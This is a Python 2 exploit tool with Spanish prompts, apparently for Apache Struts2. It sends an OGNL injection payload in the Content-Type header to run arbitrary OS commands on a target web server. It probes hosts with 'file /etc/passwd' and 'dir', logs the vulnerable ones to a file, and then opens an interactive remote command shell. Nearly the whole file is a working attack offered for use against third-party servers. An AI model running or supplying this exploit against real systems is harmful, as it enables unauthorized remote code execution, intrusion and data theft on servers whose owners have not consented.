#!/usr/bin/python
import urllib2
import os, sys
import time

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])
cls()

logo = BLUE+'''                                                             
        `.``                                                              
     `+++++++:`                                                           
    `+++++++++,`  :++'`                             .'++`                 
    ++++,..'++,.  +++'.                             ,+++,`                
   `+++.:,.,,::`  +++',                             ,+++:`                
   .+++:.`  `..   ++++,                             ,+++:`                
   .+++:`       ''+++++++  `'+``+++.`:'+'`  `'++` +'+++++++.   ;+++++,    
   `++++.       +++++++++,`'++,++++..+++'.  ,+++,`+++++++++`` ++++++++.`  
    +++++'.     ::++++';::`:++++++':.+++'.  ,+++:`:::+++';;,.,+++:::+;:`  
    .++++++'`   `,++++:,,. .+++',:,,`+++',  ,+++:``.:+++::,.`+++.:,,,,.   
     .;++++++.   `++++,``  `+++:,``` +++'.  ,+++:`  ,+++,.`  +++:.` ```   
      .,;+++++.   ++++,    `+++:.    +++',  ,+++:`  ,+++,`   ;++++:       
       `.,;+++:`  ++++,    `+++:`    +++'.  ,+++:`  ,+++,`   `++++++;`    
         `.++++,  ++++,    `+++:`    +++'.  ,+++:`  ,+++:`    .++++++'`   
           :+++,` ++++,    `+++:`    +++'.  ,+++:`  ,+++,`     ..:++++,`  
           ;+++,` ++++,`   `+++:`    +++'.  ,+++:`  .+++:`      `.,'++..  
    +,`    +++;,  ++++, .  `+++:`    +++',  :+++:`  .+++:``  :`   `;++`.  
   `++++++++++..  ;++++++.``+++:`    +++++++++++:`  `++++++``+++;,;+++,.  
   ,+++++++++,:`  `++++++..`+++:`    .++++++'+++,`   ++++++:.++++++++::`  
    .;++++++`:.    ,+++++`.`'';:`     ,++++`:++,,`   .+++++.,.:+++++;:.   
    `.,.`.,:,`     `,,,::,` `,,.`     `.:::,..,,.`    .,,,:,.`.,,.`,,.`   
       `````         ``.``              ````  ``       `..``    ``.``  By @s1kr10s
                        -=[Execute command Tools v2.1]=-                                                      
'''+ENDC
print logo

print " * Usage: www.victima.com/files.login\n\n"
host = raw_input(BOLD+" [+] HOST con http(s): "+ENDC)
print "\n"

if host.find("https://") == -1:
	if host.find("http://") == -1:
		host = "http://"+host

def validador():
	arr_lin_win = ["file /etc/passwd","dir"]
	return arr_lin_win

if len(host) > 0:
	def exploit(comando):
		exploit = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(comando)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
		return exploit

	print BOLD+" [+] EJECUTANDO..."+ENDC
	time.sleep(1)
	for valida in validador():
		req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit(str(valida))})
		result = urllib2.urlopen(req).read()
  	
	  	if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1:
	  		print RED+"   [-] VULNERABLE"+ENDC
	  		owned = open('ListVulnStrutsFinal.txt', 'a')
			owned.write(str(host)+'\n')
			owned.close()

			opcion = raw_input(YELLOW+"   [-] RUN EXPLOIT (s/n): "+ENDC)
			if opcion == 's':
				cls()
			  	while 1:
					try:
						separador = raw_input(GREEN+"\nStruts2@Shell:$ "+ENDC)
						req = urllib2.Request(host, None, {'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit(str(separador))})
						result = urllib2.urlopen(req).read()
						print result
					except:
						sys.exit(0)
						print BLUE+"\n   BYE :)\n"+ENDC
			else:
				sys.exit(0)
				print BLUE+"\n   BYE :)\n"+ENDC
		else:
			time.sleep(1)
			print GREEN+"   [-] NO VULNERABLE"+ENDC
			print BLUE+"\n   BYE :)\n"+ENDC
			sys.exit(0)
else:
	print " Debe Ingresar una Url.\n"
	sys.exit(0)
